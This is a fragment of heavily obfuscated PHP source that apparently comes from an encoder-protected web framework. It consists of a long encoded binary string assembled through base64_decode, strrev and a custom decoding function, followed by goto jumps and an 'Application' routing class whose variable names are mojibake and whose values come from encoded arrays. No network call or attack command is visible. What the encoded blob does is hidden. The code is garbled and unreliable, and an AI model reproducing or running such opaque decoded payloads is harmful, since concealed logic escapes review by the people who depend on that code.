26\372\101\13\203\351\163\150\211\101\214\244\142\373\200\146\100\102\67\26\104\320\4\307\213\73\266\244\311\125\304\346\253\344\46\251\40"."\x5e\x2a\x3c\xe5\x14\x5a\x11\x7e\x4d\x6a\xdd\xba\x72\x18\xe8\x7f\x97\x26\xf9\xf2\x46\x29\x8\x23\x5c\x29\xc\xb\x84\x4\xc\xed\x83\xce\xcf\x50\x64\x97\x33\x9\x8\xcb\x43\x7f\x45\x99\x50\xd7\x62\x11\xa1\x47\x79\x47".base64_decode('Yi/T2SKxvt5qT926dV6DaUky3SxW1sNz03ifx5kf9QSGnmcEQGlOilQnAhYd6K0TtrBcG1LB')."\52\222\55\55\13\172\71\353\325\317\322\124\42\107\221\347\216\261\256\106\303\34\206\24\350\154\31\133\306\203\376\56\301\234\163\376\323\260\103\32\323\37\344\153\213\122\53\17\21\363\371\234\156\347"."\x17\x8a\x17\x1e\x65\xfa\x46\xc3\xbe\x7c\xde\x41\x96\x58\x4\xdf\xb5\x65\x8c\xb8\x97\xd3\x12\x7a\xff\xe6\x49\x8\xfb\x51\x96\x85\x50\xb2\x12\x38\xd6\x78\x2c\x49\x40\xb8\x41\xc1\x43\x88\xc\x9b\x5\x4e\xfb\x38\x1c\xd5"."\xc5\x81\xd0\x59\x4c\x9f\x24\x72\xc4\x93\xe7\x5b\x89\x82\x91\xb7\x1d\xb4\x91\x3e\x49\x5e\x45\x1e\x3\x5c\xad\xd\x69\x34\x4b\x95\x2\x22\xbc\x96\x2a\xf2\xce\x4b\x15\x5a\xe7\x34\x85\x11\x44\xde\xc0\xf9\xf8\x6b\x88\x89".base64_decode('zrRUkU5YaV1H5Qm9q/QRVLBKYRQ5q/FxLNgm2nW5qSE8xdoTAQsrXxfceh5/Mv2dejxDL/JO')."\154\6\161\327\304\176\204\320\76\302\302\247\260\150\226\146\202\47\141\273\43\341\130\330\317\336\121\164\312\160\51\154\46\73\216\130\324\22\127\234\340\230\375\40\327\167\142\71\70\37\342\5\10\140".base64_decode('Q6GYy3GNVYzEfP9sqfynl1zM6sn+SdKVXo1d24Kgmd5DMxtZaCfaqWPY/YEFYMl5LXadqyc9')."\275\324\277\103\113\75\263\1\143\272\263\302\274\224\345\224\123\24\274\275\364\363\121\107\104\301\13\64\125\54\267\152\174\323\10\57\235\125\273\252\153\74\165\265\325\345\51\124\23\331\231\216\55\20"."\325\23\243\50\21\336\25\3\66\201\130\151\372\103\301\100\127\114\15\2\207\320\320\70\333\123\57\54\50\15\113\70\203\246\141\77\327\225\52\350\144\124\75\216\156\125\30\32\172\17\23\343\72\266"."\172\316\41\226\245\103\232\61\231\233\342\306\372\372\172\167\175\3\372\237\31\206\60\347\250\315\314\317\221\224\245\276\276\231\374\117\23\310\135\10\240\240\63\205\370\376\200\372\350\317\260\316\234\27".base64_decode('MZ9HRq7IONdeP7aNVXDTYFqEjjDCPuI9mNFaxyu1ClE7gJguBiErvawaBW/TAw5sZ1cG1LM8')."\xdb\x4b\x51\xa3\x6\xc8\x0\x41\xdb\xb9\xd9\x35\xca\x26\x56\xd0\x3c\x6a\x30\x2f\x2c\xd4\x3\xb9\x64\xaf\xfc\x31\xf\x1b\x68\xa\x14\x8f\x2e\xb8\x59\x82\x5b\x7e\x68\x9\xa\x51\xa2\x27\xee\x14\x1d\x4d\x43\x65\x9c\x2e"."\x8a\x31\x4\x71\x4a\x9\xde\x67\xc\x90\xc4\xb7\x98\x45\x96\xdc\x2e\xe3\xa8\x7c\x75\x48\x92\xb9\xed\x32\x89\x65\xb8\xbf\x19\x1c\xed\xe2\x35\xd1\xf7\xbc\x54\x2d\xce\x6f\xa2\x2b\xad\xc8\xb4\x39\xac\xa\xe6\x5\x47\x4f".base64_decode('5DEypHjnYiiZlOzL8biy/UnKzjXshAIScHXEJ8qgkXG4bFClovLYzsMZWU9izpL4RXHcUDdu').base64_decode('d7MYRUTffPylM6qizdqrAMWhUfLuAn1Km0iCmg8sm3C7dLLJvDluQEpVHVlMmj12KRb9Gm1E')."\6\11\60\0\275\316\363\163\237\305\122\5\245\111\45\145\174\364\56\255\254\0\300\313\163\223\53\307\12\271\61\274\44\67\361\116\354\347\116\330\145\227\305\124\210\45\351\265\131\360\4\215\120\52".strrev('—'."\n".'ç@Jt8«)O7É-’o*Û7/ˆ>rõ¼L…g<½`ÊîğCAä°L `¾OZGIub')."\22\374\374\101\102\31\210\317\312\262\32\31\71\212\70\353\300\207\160\47\204\267\354\53\220\216\311\114\354\202\226\263\122\262\126\14\313\46\250\24\226\147\311\117\304\252\16\64\141\270\312\264\326\360".base64_decode('CAntECecwqhUw3FjHCPEL6PHoDlAHsmiwhWE2JviUYeHf0DTZsaryMWcaW+fewkLXMpy4WHl')."\xcf\xf2\xca\x77\x73\x78\x48\x55\x59\xe0\x84\x57\x74\x87\xcd\x5c\xec\x55\x40\x44\x27\xb2\x95\x61\x15\xd9\xd7\x71\x5\xcd\x9c\x2c\x49\x31\x5c\x3b\xbb\x16\x45\x27\x71\x70\xa7\xe3\xc2\x60\x85\xbe\x75\xaf\xe4\x74\xee\x38".strrev('PƒÀ†ã¯…F”=ØÓÀÚÓÍ2­Æ˜íe+oâJœ%¨”õuÂ.€v%ÜDĞxr©9Ã')."\xa\xf3\x5a\x6c\xe3\x47\x7d\xed\x47\x87\x26\xb1\xed\xc0\x2c\xf5\x52\xb2\xcd\x3e\x84\xfb\x1\xa1\x24\x9b\x34\xc5\xb9\xd\x4b\x9b\x8a\x22\x57\x84\xb6\xe7\x58\x1a\x4b\x92\xfa\x15\xd2\xf6\x79\xe4\x5d\x97\xa\xa9\xd8\x73"._kodDe('Muf14wb7/O3HT7boxnmM45eRESJpHxAEsZK8w99ONvKg7uPevQZloFuHmCkMrUeN913iF5MyTw==')."\236\74\12\42\211\2\112\242\245\72\301\270\204\304\25\241\250\264\143\23\176\301\146\133\76\173\22\104\350\322\222\240\40\322\157\137\165\56\13\234\43\160\55\52\251\140\126\150\37\324\312\353\304\55"."\xc8\x9\x55\x5e\x60\x7c\xa\x7a\xc2\x2c\x24\xf1\xa6\x29\xb9\x17\xca\xd9\x11\x7d\x40\x8e\x12\xe5\x7\xb6\x62\xc4\x73\x2\x72\x15\xd8\x47\x9d\x44\x9a\xf0\x4a\xf5\x25\xec\xa2\xec\xf1\x4e\x7a\x71\x4\xc5\x24\x95\x2f\x89".strrev('Ó’À÷İâ¸Fcó™ìÊk	v]ùÆ-BDèZ§Draâ%Ä1+ù J]24ÍiVœ(7u™')."\120\265\330\323\277\350\231\134\204\174\263\254\10\115\303\314\227\260\36\224\123\54\374\266\114\17\233\305\112\51\25\76\105\222\244\21\115\160\156\34\106\107\14\22\44\214\352\114\11\335\335\320\350\236"."\x1\xa7\x20\xd9\xa2\x90\x1d\xf0\x60\xaf\x41\xeb\x4c\x42\x3\x7c\x44\x66\xa4\xe\x54\xb8\x21\x9f\xc8\x63\x4a\x5a\x1\xc4\x9\x96\xf0\xd7\x43\x3c\x7f\xf1\xf9\x24\x2e\xc2\x78\x4c\xe7\x2a\xdd\xc4\x2b\x96\x4c\xee\x85\x92"."\23\325\364\306\31\172\52\245\323\121\301\311\155\16\335\374\222\14\150\115\70\323\341\301\30\301\360\120\307\134\246\103\123\262\244\22\170\330\110\176\22\207\224\22\375\20\6\14\10\144\322\147\151\244"."\301\20\312\132\324\137\30\263\320\340\164\116\200\143\46\7\226\53\174\141\114\204\52\251\113\5\70\51\327\324\142\227\12\16\321\145\347\50\67\174\307\312\224\170\363\346\32\371\226\34\141\251\34\41".strrev('—Fjß âğ¡(HÖpàÃ‡D}M'."\r".'3ôMøE€©$¾V åíÑİß„ìï3¬5ÏsJ:§j„G-')."\50\3\370\152\127\50\56\242\346\252\144\251\252\226\170\243\211\256\24\42\252\246\63\300\120\72\316\237\72\302\101\167\34\35\51\334\111\176\24\263\304\241\213\164\12\52\23\157\114\72\253\245\210\250"."\27\312\152\314\141\3\307\114\131\31\54\200\257\220\73\43\344\307\122\346\174\101\57\317\77\252\143\235\111\251\305\122\201\142\205\326\100\376\312\137\40\357\124\311\271\21\247\244\347\46\153\274\221\33".base64_decode('MixDrHpWYlSu3dfWGexSfaFQeJlDqVlcPRS4zCUpPzMmzYyYBPp12SGnDHG8w1Iih6HTJ/uQ')."\225\166\6\54\52\105\214\246\306\135\204\346\331\355\32\274\324\314\337\25\242\121\351\211\100\354\231\330\322\45\0\175\315\256\1\54\376\264\114\306\361\2\160\46\45\105\213\316\55\267\342\247\124\372"."\x1\x6\x23\xfc\xf0\xe4\x19\x22\xc1\xc5\x1d\xb1\xff\x75\x53\x8d\xa4\xf0\xaf\x68\x24\x99\x26\x1b\x37\x22\xa7\x4f\xe\xf9\xe5\xb7\xaa\xd9\x37\xc5\xc3\x56\xe5\x90\xff\xed\x13\x8b\x2e\x71\x43\xa9\x12\xf7\x71\xec\x71\x57"."\x93\x9c\xae\x80\xf5\xa7\xb0\x60\x58\x25\xb2\x75\x55\x7c\x2\x31\x32\x85\xd1\xbc\x7c\x33\xec\x4d\x42\xd\xd8\x2f\x6e\x80\xd9\x3c\xe1\x88\x38\xde\xe0\x5c\x50\x9\xfe\xa\x3d\xf4\xa2\xb3\x3c\x96\x4b\xb2\x83\x10\x93\xf1"."\41\252\2\3\356\320\336\54\171\43\262\124\357\337\361\2\144\331\67\310\253\102\64\255\27\367\2\345\354\27\175\102\61\256\45\57\212\226\246\124\150\0\112\126\204\264\214\147\120\132\224\172\372\232"."\x29\x7f\x21\x4a\x99\xcf\xdc\x61\x88\xf\x10\x3f\x8e\x81\x6c\xde\x76\x8\x4\x3a\x64\x2b\x20\x69\x4a\xd8\x2c\xa9\xf2\x1e\x39\xf\x5c\x6b\x32\xc9\x20\x9e\x5b\x8\x13\x52\x2c\x8e\x86\x58\x99\xd3\xcc\x8e\x96\x1\x1c\xc2"."\264\20\353\1\127\253\306\57\151\345\122\246\74\322\304\54\0\33\177\321\27\211\251\214\302\205\116\45\272\135\376\224\41\55\376\377\246\40\115\214\112\56\214\235\225\224\67\310\52\335\102\371\366\347".strrev('iíô³$ÄNÄ=¬}˜#‘{µä(&Œ-xá8aÒQ~Aúâ1­/*BjÌoq"Å›çaÍ¦6O `°').strrev('ƒÄá—Î°/bwOJÔNó¥ôœµä´ˆRSº'."\0".'&®’dm?£#–²|)AIÍ~§ô')."\x7b\x62\x63\x76\x3e\x40\xc6\x95\x11\x2c\xb1\x88\x2c\xdb\xf1\xe4\x5d\xcc\x8c\x69\x3\x2e\x8a\xd3\x98\x2c\x8a\x58\xeb\xa8\x1c\x96\x15\xff\x49\x2f\x50\x22\x13\x25\xa\xc3\xe1\x5\xc\xe2\x22\x2f\xb2\x52\x6a\x58\xfa\x4e"."\233\264\52\71\321\225\215\143\6\210\263\122\120\124\54\261\350\36\60\164\266\161\70\262\121\220\127\313\347\305\145\212\274\7\243\177\35\26\343\220\326\23\353\120\211\77\25\225\152\115\104\245\75\122".base64_decode('XHBSIFx2FnNBeqnjgBakU6Ps/pte9AhzYsiO2tlNr3thwOQq2RU8F8wjKsQP197yK3us4wY0')."\x5\xeb\x14\x31\x65\xae\x41\x93\x1c\xce\x3c\xf2\xb1\xe\x32\x28\xf3\x99\x27\x1c\xc4\x78\xba\x5\x66\x38\x56\x35\xc6\x24\xc4\x72\xd3\xe7\x6f\x9\xd9\x90\x29\x5f\x65\x28\x61\xc6\x9\x75\x75\x3\xa1\x60\x36\xb6\x74\xaf"."\xc3\x9e\x2b\x98\x4b\xdc\xc\x3f\x86\xf1\x57\x78\xa5\x28\x5f\x5\xce\x37\x5\xe9\x72\x21\x3f\x6d\x7a\x8a\x9f\xb1\x70\x5c\xb0\x14\xb2\x53\x29\xa1\x43\x54\xfa\x6e\x6e\xf9\x1b\xc0\xec\xbd\x5f\xb6\xde\xe0\xb1\xdf\xa\x2f"."\xf8\x4e\xfa\x0\xb0\x4b\x98\x9e\x7f\xd5\x53\x85\xc2\xd0\x39\x8f\xe6\xd2\xf9\x9a\x33\x67\x48\xf8\x91\xa6\xec\x54\x54\x7a\x20\xe2\x93\x51\x52\x20\x52\x3a\x61\x31\xb3\x5c\xa4\x2d\xb4\x22\x1c\xcf\x13\x4b\xbd\x6\x7a\x58"."\xfe\xc4\xb1\x34\xc\x52\xbf\x8b\x85\x8c\x8b\x28\x88\xb8\x98\xbe\x66\xc5\x57\x92\x1d\xf\x27\x96\x4e\x68\x25\x94\xc0\xd1\x70\x46\xee\x72\x4f\x21\x23\x9e\x1f\xa5\x2d\x12\xb3\x29\x4f\xd1\xd7\x36\x6\x4c\x39\xc8\x59\x32".base64_decode('6SSzzfPjBXbhXprNcKwWxBoIu0nqsbtsR1qRTTbOmDVXltOI6RfX0ODQBm7Tga0SCKU4htCl').base64_decode('MDfhMukhiU7boPLnvEu2nP/dYhNnIZpVdttEHzw2M/hInsVXAHZBcx47K5yu2P5Nxqzi25/S')."\x7e\xea\x2a\xdb\x5b\x5d\xfc\x31\x66\xb6\x76\xf9\x88\xc2\x92\xce\x19\x89\x41\xe2\xd5\x87\x7c\x41\x1b\x42\x3b\x60\xc1\x65\xe9\x23\x2e\x3a\x60\x2e\xf9\xa\x9c\x1e\xa1\x84\xda\x18\xee\xc\x47\x53\x52\x52\xda\x24\xc4\x79"."\256\102\167\361\20\211\243\6\151\244\40\77\164\124\331\376\347\324\52\263\265\70\171\65\335\140\246\134\204\56\110\312\205\304\364\216\127\205\275\201\210\125\314\247\264\322\100\226\174\215\142\262\211\65"."\xb8\x2c\x89\x32\x3a\x6b\xa0\x33\x50\x1\x41\x24\xe\xc6\x41\xc1\xda\xf8\xa9\x1c\xb\xe4\x45\xcc\xd9\x49\x90\x9d\x89\x64\xe9\x24\x5d\xf9\xe8\x8d\xc7\x92\x88\xab\xc3\xb9\xcc\x68\xa5\xae\x57\xe8\xc2\x57\xe0\x35\x3b\xec"."\172\27\211\246\113\32\114\316\11\52\151\5\345\240\71\316\224\275\117\356\326\154\267\114\250\204\374\127\267\303\144\270\201\250\12\321\103\311\27\120\106\121\252\337\245\114\226\251\314\176\130\176\177\134"."\370\327\224\270\146\134\232\171\33\230\104\126\303\250\271\374\262\272\235\26\347\111\112\211\34\124\111\172\106\100\66\255\46\25\311\250\133\136\265\364\110\264\220\343\21\301\37\164\2\150\25\121\145\41"."\146\370\276\305\334\64\137\223\224\65\235\302\105\265\224\26\140\134\21\135\260\115\71\54\75\76\216\266\307\60\263\172\101\315\161\10\2\120\134\240\204\104\216\223\45\100\66\146\144\1\362\6\320\223"."\x43\x1d\x9c\x19\x64\x7\x10\x8e\xa3\x27\x7f\x45\xd7\x71\x14\xb5\x4a\x9f\xd2\x46\x4c\xb6\xe3\xb9\x9f\xa4\x60\x5c\x80\xea\xc1\xae\x40\x8c\x1c\xe9\xd7\x24\x9e\x44\xb0\x1f\x22\xd4\x55\xcc\x8a\x88\x24\xa4\x27\x67\x59\x9e".base64_decode('6PCTgd1Ilqxu5n0DOzORL1Spi3saZoes/+tXpP+/ejx6Vj27TuEmkoQEs8hiOPNAs/EFN6fs')."\124\246\137\322\41\47\23\161\0\40\27\232\5\317\220\240\61\44\316\115\2\230\117\121\346\152\124\143\367\237\132\46\43\261\32\225\117\211\302\53\201\151\146\342\132\301\203\160\162\220\277\13\137\51"."\122\152\313\35\325\122\272\334\346\136\42\136\107\300\50\226\47\367\13\212\202\141\225\212\311\17\215\43\22\223\227\10\44\251\13\101\244\132\270\22\50\144\166\163\36\305\222\32\126\101\50\303\16\66"."\x82\xcc\xb1\xed\xbd\x64\x24\x88\x8e\xb4\xf3\x91\xb\x89\x97\x2b\xcb\x26\x9a\x8f\x58\x3e\xae\xa6\xcd\x42\x9\xcc\x72\x10\x2f\x45\x30\xd\xb2\x1f\x89\x70\x9e\x1d\xfc\x6b\x61\x33\xe9\x5f\xc4\xa8\x21\xf1\x5e\x3\x44\x51"."\x26\x84\xe\x50\x19\xf9\x8c\x39\x26\xd7\x1\x94\xe7\x4d\xd0\x38\x8f\xd3\x6d\x16\x94\xe8\x2c\x79\x7\x9d\x66\xb2\xe4\xb1\x75\x5c\xf0\x94\x2b\xc5\x94\x97\xe6\x94\x45\x2e\x82\x4d\x3a\x9c\xc2\x4b\x3c\xad\xe4\x4\x58\xef".base64_decode('LgE0uEuq40/BOxeN421yqkiEVloEC6yYsJLcCxIlAnd5GbpAoiLPJEu0MsXgjRICWxySx4NR')."\236\356\202\111\370\152\47\224\13\361\44\155\371\204\44\25\57\345\323\50\170\232\247\154\127\144\104\330\61\123\130\63\123\334\107\307\302\221\200\272\54\210\175\236\4\127\6\172\230\257\157\303\44\157"."\360\260\52\173\72\153\210\75\43\54\0\164\140\154\67\5\52\351\210\74\112\42\172\341\260\332\316\346\375\374\366\334\151\364\56\31\321\60\17\160\262\320\330\231\31\33\100\71\327\342\202\112\331\22"."\x66\xc1\x2a\x3b\x52\xb0\x44\xcc\x64\x9b\x28\x35\xc2\x64\x1e\x29\xa6\x2\xd3\x93\x43\x2b\x5a\x4f\xd8\x7a\x52\xc1\x9c\x82\xe3\x2c\xd4\x3b\xb3\x7e\x46\xff\x57\x55\x87\xd2\x79\xce\x99\x5f\x93\x13\xe\x65\xd1\x19\x6e\xa6"."\xcd\xcd\xf2\x54\x2c\x67\x52\x5f\x4d\x95\xd2\x10\x92\x46\x6d\x7\x36\x89\xb7\x9e\x4a\xdf\x78\x72\xbe\xe9\xd4\x2c\x49\xb3\xe9\x73\x59\x8e\xc7\xe0\xca\x26\xa9\xcb\xf4\xb\x1e\xa6\x24\xd\xd3\x88\xc9\x53\xb1\x44\x80\xeb"."\12\260\227\173\260\166\244\27\73\214\303\46\75\136\202\210\160\11\261\102\315\252\114\61\14\313\141\204\70\216\220\336\362\263\64\174\311\56\214\206\13\221\154\127\231\233\105\247\345\236\124\236\234\277"."\250\334\315\41\176\3\355\17\31\44\335\171\241\143\154\322\371\356\37\111\44\140\346\177\36\152\220\356\363\235\352\24\334\50\272\154\317\55\32\41\51\231\224\142\76\216\321\57\166\337\20\24\16\275"."\110\62\275\254\364\225\236\53\245\122\75\16\21\201\244\174\221\40\304\44\120\176\327\56\124\0\44\106\226\25\303\62\6\301\114\224\300\45\342\53\266\107\155\110\260\345\342\10\227\114\266\153\103\25".base64_decode('sibLDpkIwrMStl7yuyIMsPRh+euQTxg8OTKWQ4VfFql8yeGcdBPDKnWfEENncdnvC0cqAaKv').base64_decode('n3FNJUnygTW7hAoT7QoXuolPOr3M8Gx8zlAeYqbpdkBLzu5Yvsl4z5IkkPhJ1VcUDEoooGdC')."\x52\x75\xb2\xee\xc5\xa4\x5\xa2\x95\x3f\x22\xb0\xd2\x39\xc4\x92\x7b\x1e\x91\xc0\xb8\x1b\xd3\x31\xf8\xd2\xf6\xc6\x3b\x6\x39\x23\x72\xa2\xa3\x39\x15\x50\x83\x1d\x47\x64\x39\x75\x79\xa2\x99\xc9\xe0\xdb\xf4\x49\x92\xa9".strrev('›(^±< t’Ò\'a°øeFÇÒ˜é@¹7/_š$Î|ÓE^D³‡àr Úlâç—´¶:')."\146\150\100\345\176\224\266\226\315\162\251\246\226\250\244\254\75\222\32\131\314\254\120\206\266\250\142\61\232\204\113\212\243\230\243\354\44\103\200\313\322\44\134\266\54\231\25\56\33\127\122\316\326\212"."\xd6\x24\xdd\x2b\x1f\x3c\x90\x83\x26\x2b\x74\x58\xc8\x17\xa5\xac\x93\x8d\x67\xc5\xcc\xe5\x9f\x83\x35\x50\x9a\x9b\x48\xdb\x2a\xb7\x42\x12\x47\x3a\x35\x7a\x2a\xb5\xa2\x62\xe6\x49\x5b\x51\x9a\x5b\xf0\x43\xf8\xe0\x5d\x29"."\245\342\2\5\115\225\12\73\6\113\251\260\107\120\372\67\251\212\234\120\33\53\337\254\104\132\5\45\66\372\111\314\231\311\156\115\53\44\313\32\161\225\165\346\42\25\351\233\345\124\146\53\201\73"."\x1c\x5a\x53\x92\x44\x23\x4c\xd1\xb5\xa0\xaf\x91\x8d\x97\xb9\xa2\xa7\xa8\x11\x31\x90\x19\x63\x50\x68\x14\x33\xcb\xa3\x69\x8e\x6d\xae\x98\x1b\xcc\x99\x7c\xeb\x4c\xa\x2d\x72\xcc\xf7\xf9\xa\xa5\x33\x51\x56\x9b\x73\x71"."\344\212\322\343\13\25\15\241\134\130\176\126\56\233\312\150\334\144\125\150\131\322\243\277\151\33\11\335\371\302\203\354\174\221\246\263\217\144\204\344\273\364\176\102\110\363\34\132\130\225\204\371\30\104"."\203\36\161\175\107\353\223\30\67\201\65\16\233\105\312\56\301\135\51\325\271\360\343\13\121\176\277\116\156\47\50\173\101\223\243\146\301\166\341\264\230\231\47\277\255\246\155\13\265\45\166\127\202\16"."\11\230\107\160\111\32\173\50\44\56\326\161\243\310\65\55\101\154\172\333\201\203\240\375\201\5\120\121\235\246\22\112\350\210\340\353\137\36\221\131\0\270\334\155\57\226\350\251\10\300\240\231\214\233".strrev('‘(ú'."\n".'¢—'."\0".'ÕWÀµ¹Y÷ÓŠ8Î¬öFâäÜÁw…âš^XæHd¬›à½Äi+Â(åÌ#')."\x2a\x83\xe1\x64\x34\x16\x2d\x4b\xea\xf6\x45\xa3\xcb\xc2\x91\x36\xfa\x86\x50\x59\x32\x29\x25\x69\x6f\x96\x25\x75\x77\x84\xbb\x26\x4b\xb\x74\xfa\x82\xa1\xb2\x34\xac\xe8\xd9\xa5\xa\x1f\xb5\x34\x29\xd8\x4d\x5a\x49\x74".strrev('³ç|à<âß1fE|›éN2‹\\+=/ëåà÷±ª?–=»²m>`%Ò	1Yyà†z]„´D¿ĞEk&')."\104\263\332\251\374\303\60\27\252\305\372\233\135\360\245\110\36\240\370\335\45\116\0\370\41\103\250\11\171\34\32\110\22\234\54\22\102\165\244\265\53\157\371\344\222\230\13\345\110\162\135\305\301\253"."\x70\x77\x29\x2b\x60\xe1\x54\x31\x38\xb8\x99\x27\xb2\x37\x18\x56\x9b\x71\x71\xae\x83\x3\x1f\xf8\x45\x80\xe1\x96\x34\x76\x69\xd8\x91\x6c\x6b\x3\x4c\x66\xea\xd0\xb7\xa1\xa2\x74\x4c\x14\x84\x90\xfb\xff\x1\x80\x4a\x5c"."\xb\xdd\xbe\x0\x0"."".""._kodDe('KA==')."", 10, -8))); goto F‹„šñÈàÀ; FÒÙÊíÁ¤: class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\x69\156\x64\x65\x78"; function __construct() { } public function setDefault($ä¼¹üŞè) { $ùªÌŸ‘¥ =& $_SERVER[¾¹â¾·à]; $±³”—â± = explode($ùªÌŸ‘¥[0], trim($ä¼¹üŞè, $ùªÌŸ‘¥[0])); $§¡õöò° = $_SERVER[‰‰Ş‚€][707]; if (!$§¡õöò°) { return; } $this->defaultModule = $±³”—â±[0] ? $±³”—â±[0] : $this->defaultModule; $this->defaultController = $±³”—â±[1] ? $±³”—â±[1] : $this->defaultController; $this->defaultAction = $±³”—â±[2] ? $±³”—â±[2] : $this->defaultAction; $this->srcqebfb6d9e($ùªÌŸ‘¥[1], array($this, $ùªÌŸ‘¥[2])); } public function appRun($üºÌ‡) { $ô×ğŞØÁ =& $_SERVER[‰‰Ş‚€]; $ˆ‡Ûï”­ =& $_SERVER[¾¹â¾·à]; $š™ĞéÕ¡ = explode($ˆ‡Ûï”­[0], $üºÌ‡); $ø– ğÛ = $ô×ğŞØÁ[708]; $‚şç¶ô¾ = strtolower($š™ĞéÕ¡[0]); $üËÒ™µ¸ = $ˆ‡Ûï”­[3]; $¹ïºß½¼ = $ô×ğŞØÁ[709]; if ($‚şç¶ô¾ == $ˆ‡Ûï”­[4]) { $üËÒ™µ¸ = $ˆ‡Ûï”­[5]; $š™ĞéÕ¡[0] = $ˆ‡Ûï”­[6]; $š™ĞéÕ¡[1] = $š™ĞéÕ¡[1] . $ˆ‡Ûï”­[7]; $üºÌ‡ = join($ˆ‡Ûï”­[0], $š™ĞéÕ¡); $üºÌ‡ = trim($üºÌ‡, $ˆ‡Ûï”­[0]); } call_user_func(array($ˆ‡Ûï”­[8], $ˆ‡Ûï”­[9]), $üËÒ™µ¸ . $ˆ‡Ûï”­[10], $üºÌ‡); ActionCall($üºÌ‡); call_user_func(array($ˆ‡Ûï”­[8], $ˆ‡Ûï”­[9]), $üËÒ™µ¸ . $ˆ‡Ûï”­[11], $üºÌ‡); } private function autorun() { $¼ù°ƒÂ =& $_SERVER[‰‰Ş‚€]; $®÷ÛÏ£ =& $_SERVER[¾¹â¾·à]; global $config; $”Œ¾†ÏÎ = $¼ù°ƒÂ[710]; if (strlen($”Œ¾†ÏÎ) < $¼ù°ƒÂ[711]) { return; } if (count($config[$®÷ÛÏ£[12]]) == 0) { return; } foreach ($config[$®÷ÛÏ£[12]] as $©ËÜêŞ => $š¦À«îÔ) { $this->appRun($š¦À«îÔ); $Œ¨õ¬§œ = $¼ù°ƒÂ[712]; if (strlen($Œ¨õ¬§œ) < $¼ù°ƒÂ[713]) { return; } } } private function gmyv57e1ae8c() { $Áë“ôÛÜ =& $_SERVER[‰‰Ş‚€]; $ÙÓà§Â¢ =& $_SERVER[¾¹â¾·à]; $ ÆÇí’á = $ÙÓà§Â¢[4]; $ËÃÆ±ˆ“ = $GLOBALS[$ÙÓà§Â¢[13]][$ÙÓà§Â¢[14]][0]; if (!$ËÃÆ±ˆ“ || strlen($ËÃÆ±ˆ“) <= strlen($ ÆÇí’á)) { return; } if (strtolower(substr($ËÃÆ±ˆ“, -strlen($ ÆÇí’á))) != $ ÆÇí’á) { return; } $Ş¦Õè¹İ = substr($ËÃÆ±ˆ“, 0, -strlen($ ÆÇí’á)); $Ò“©¡‘¬ = $Áë“ôÛÜ[714]; if (!$Ò“©¡‘¬) { die; } $£ˆ™ñ¾ = array($ÙÓà§Â¢[4], $Ş¦Õè¹İ); $ÚÂú²²Õ = array_slice($GLOBALS[$ÙÓà§Â¢[13]][$ÙÓà§Â¢[14]], 1); $“²Şøîê = $Áë“ôÛÜ[715]; $GLOBALS[$ÙÓà§Â¢[13]][$ÙÓà§Â¢[14]] = array_merge($£ˆ™ñ¾, $ÚÂú²²Õ); $ıÔüÃ£€ = $Áë“ôÛÜ[716]; if (!$ıÔüÃ£€) { return; } $GLOBALS[$ÙÓà§Â¢[13]][$ÙÓà§Â¢[15]] = implode($ÙÓà§Â¢[0], $GLOBALS[$ÙÓà§Â¢[13]][$ÙÓà§Â¢[14]]); } private function dnshff217ed4() { $ƒ³†¯˜ =& $_SERVER[‰‰Ş‚€]; $ÓÜë„ƒ =& $_SERVER[¾¹â¾·à]; if ($GLOBALS[$ÓÜë„ƒ[13]][$ÓÜë„ƒ[15]] != $ÓÜë„ƒ[6]) { return; } $Œ¿Ëİ°— = $_SERVER[$ÓÜë„ƒ[16]]; $î”¸ã‹Û = $ƒ³†¯˜[717]; $Ù¸Ü = $ÓÜë„ƒ[17]; $Ó¬Â”– = $ƒ³†¯˜[718]; if (!strstr($Œ¿Ëİ°—, $Ù¸Ü)) { return; } $¯”ÈŸº³ = strrpos($Œ¿Ëİ°—, $Ù¸Ü); $Ò¿Å‚äÆ = substr($Œ¿Ëİ°—, $¯”ÈŸº³ + strlen($Ù¸Ü)); $¨ùõ¨ì³ = $ƒ³†¯˜[719]; preg_match_all($ÓÜë„ƒ[18], $Ò¿Å‚äÆ, $œßÑ€í–); $Ò¿Å‚äÆ = trim($œßÑ€í–[0][0], $ÓÜë„ƒ[19]); $GLOBALS[$ÓÜë„ƒ[13]][$ÓÜë„ƒ[14]] = explode($ÓÜë„ƒ[19], $Ò¿Å‚äÆ); $å‡ Ğ‚ = $ƒ³†¯˜[720]; if (strlen($å‡ Ğ‚) < $ƒ³†¯˜[713]) { return; } $GLOBALS[$ÓÜë„ƒ[13]][$ÓÜë„ƒ[15]] = implode($ÓÜë„ƒ[0], $GLOBALS[$ÓÜë„ƒ[13]][$ÓÜë„ƒ[14]]); $Òú¹ıâ… = $ƒ³†¯˜[721]; while (strlen($Òú¹ıâ…) < $ƒ³†¯˜[713]) { if (!$Òú¹ıâ…) { break; } $Òú¹ıâ…++; } } public function run() { $Ë¯”ŒÒ° =& $_SERVER[‰‰Ş‚€]; $ŒŒüçÉ» =& $_SERVER[¾¹â¾·à]; $this->dnshff217ed4(); $‰Ö©Œé» = $Ë¯”ŒÒ°[722]; if (!$‰Ö©Œé») { return; } $this->gmyv57e1ae8c(); $—âùú = $Ë¯”ŒÒ°[723]; $Ô¤‘–‚‰ = $GLOBALS[$ŒŒüçÉ»[13]][$ŒŒüçÉ»[14]]; $şì…Ò§¹ = $Ë¯”ŒÒ°[724]; if (!$şì…Ò§¹) { return; } $¢ğ‚‘öÄ = $GLOBALS[$ŒŒüçÉ»[13]][$ŒŒüçÉ»[15]]; $ôÙÂÑæ£ = $Ë¯”ŒÒ°[725]; while (strlen($ôÙÂÑæ£) < $Ë¯”ŒÒ°[713]) { if (!$ôÙÂÑæ£) { break; } $ôÙÂÑæ£++; } define($ŒŒüçÉ»[20], isset($Ô¤‘–‚‰[0]) && $Ô¤‘–‚‰[0] ? $Ô¤‘–‚‰[0] : $this->defaultModule); $ª©õè« = $Ë¯”ŒÒ°[726]; define($ŒŒüçÉ»[21], isset($Ô¤‘–‚‰[1]) && $Ô¤‘–‚‰[0] ? $Ô¤‘–‚‰[1] : $this->defaultController); $Êœ®Ş­â = $Ë¯”ŒÒ°[727]; if (strlen($Êœ®Ş­â) < $Ë¯”ŒÒ°[713]) { die; } define($ŒŒüçÉ»[22], isset($Ô¤‘–‚‰[2]) && $Ô¤‘–‚‰[0] ? $Ô¤‘–‚‰[2] : $this->defaultAction); define($ŒŒüçÉ»[23], MOD . $ŒŒüçÉ»[0] . ST 